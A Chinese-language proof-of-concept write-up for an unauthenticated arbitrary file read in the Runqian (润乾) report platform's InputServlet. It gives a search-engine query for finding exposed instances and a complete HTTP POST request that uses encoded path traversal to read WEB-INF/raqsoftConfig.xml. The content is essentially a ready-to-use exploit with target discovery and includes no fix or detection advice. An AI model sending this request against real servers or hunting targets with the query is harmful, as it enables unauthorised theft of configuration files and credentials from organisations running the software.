# 润乾报表InputServlet存在任意文件读取漏洞

# 一、漏洞简介
润乾报表是一个纯JAVA的企业级报表工具支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，提供高效的报表设计方案、强大的报表展现能力、灵活的部署机制，支持强关联语义模型，并且具备强有力的填报功能和olap分析，为企业级数据分析与商业智能提供了高性能、高效率的报表系统解决方案。润乾报表InputServlet存在任意文件读取漏洞，未经身份攻击者可通过该漏洞读取系统内部配置文件及敏感数据凭证，使系统处于极不安全状态。

# 二、影响版本
+ 润乾报表

# 三、资产测绘
+ hunter`app.name="润乾报表平台"`
+ 特征

![1712713418597-1304fe4b-6423-40c5-b6c4-622581d06799.png](./img/3t8T2Ov2W0KH4EFf/1712713418597-1304fe4b-6423-40c5-b6c4-622581d06799-025732.png)

# 四、漏洞复现
```java
POST /InputServlet?action=13 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: application/x-www-form-urlencoded
Connection: close
 
file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
```

![1713167588772-85cd2ff7-f7f1-417c-a916-bb61f767a6e9.png](./img/3t8T2Ov2W0KH4EFf/1713167588772-85cd2ff7-f7f1-417c-a916-bb61f767a6e9-908853.png)



> 更新: 2024-04-16 14:37:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/myq4mz6ygioo0z8s>